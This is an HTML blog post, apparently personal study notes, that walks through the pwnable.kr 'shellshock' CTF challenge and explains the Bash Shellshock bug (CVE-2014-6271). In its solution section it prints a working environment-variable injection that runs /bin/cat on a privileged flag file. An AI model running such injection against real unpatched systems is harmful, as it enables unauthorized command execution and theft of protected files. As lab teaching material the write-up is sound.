@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pwnable.kr - shellshock &middot; M1r4c13</title>
+<meta name="description" content="Pwnable.kr - shellshock -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">Pwnable.kr - shellshock</h1>
+<p class="meta"><span class="mono meta-date">2017.01.29</span><span class="tags"><span class="chip mono">ctf</span><span class="chip mono">pwnable.kr</span></span></p>
+<div class="post-body"><h3>0x00 Puzzle</h3>
+<pre><code>Mommy, there was a shocking news about bash.
+I bet you already know, but lets just make it sure :)
+
+
+ssh shellshock@pwnable.kr -p2222 (pw:guest)
+</code></pre>
+<h3>0x01 Explore</h3>
+<pre><code class="language-bash">**ssh**
+$ ssh shellshock@pwnable.kr -p2222
+shellshock@ubuntu:~$ ls -l
+total 960
+-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
+-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
+-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
+-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
+</code></pre>
+<p><strong>shellshock.c</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main(){
+    setresuid(getegid(), getegid(), getegid());
+    setresgid(getegid(), getegid(), getegid());
+    system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;);
+    return 0;
+}
+</code></pre>
+<h3>0x02 Shellshock</h3>
+<p>Google for shellshock, you will find this in <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">wiki pedia</a>:</p>
+<pre><code class="language-bash">$ env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;
+</code></pre>
+<p>It's initially reported in CVE-2014-6271.</p>
+<p>Explaination:</p>
+<ul>
+<li>
+<p><code>env var=value</code> means assignment value to environment variable <em>var</em>, for just this cmd.</p>
+</li>
+<li>
+<p><code>() { :;};</code> this is the magic string, which means build up an empty bash function.</p>
+</li>
+<li>
+<p>When <code>bash -c "..."</code> is going to execute, it first set the new env variable <em>var</em>, and vulnerable bash would find that there is a function followed it, so it build up the function until it ends at <code>};</code>, then it process the folowing string as commands, so <code>echo vulnerable</code> gets executed.</p>
+</li>
+</ul>
+<p>For this puzzle, the program use a vulnerable version of bash staying at home dir.</p>
+<pre><code class="language-bash">shellshock@ubuntu:~$ file /bin/bash
+/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0428e4834e687e231fa865562d32fbb64ce45577, stripped
+shellshock@ubuntu:~$ file ~/bash
+/home/shellshock/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fbce43e6d92a672c6750954e7d5311c5da48abdb, stripped
+</code></pre>
+<p>As you can see, /bin/bash is of GNU/Linux 2.6.32, while ~/bash is of GNU/Linux 2.6.24.</p>
+<h3>0x03 Solution</h3>
+<p>So the idea is that assignment the magic string and <code>cat flag</code> command to any variable of env before execute the binary, so that <code>cat flag</code> would be executed with the binary's priviledge.</p>
+<p>Notice: since the env variables cannot be used when the empty function being built, only <code>cat flag</code> cannot be recognized. Full path of command's binary should be used.</p>
+<pre><code class="language-bash">shellshock@ubuntu:~$ env x='() { :;};/bin/cat ~/flag' ~/shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+</code></pre>
+<p>I'm not sure what caused the segmentation fault. It might has something to do with the failure of the executation of original <code>'echo shock_me'</code>.</p>
+<p>Done!</p>
+<h3>Ref</h3>
+<ul>
+<li>wikipedia - <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a></li>
+<li>
+<p>Symantec Official Blog - <a href="http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability">ShellShock: All you need to know about the Bash Bug vulnerability</a></p>
+</li>
+<li>
+<p>cloudflare - <a href="https://blog.cloudflare.com/inside-shellshock/">Inside Shellshock: How hackers are using it to exploit systems</a></p>
+</li>
+<li>
+<p>extremetech.com - <a href="https://www.extremetech.com/computing/190959-shellshock-a-deadly-new-vulnerability-that-could-lay-waste-to-the-internet">Shellshock: A deadly new vulnerability that could lay waste to the internet (updated)</a></p>
+</li>
+</ul></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
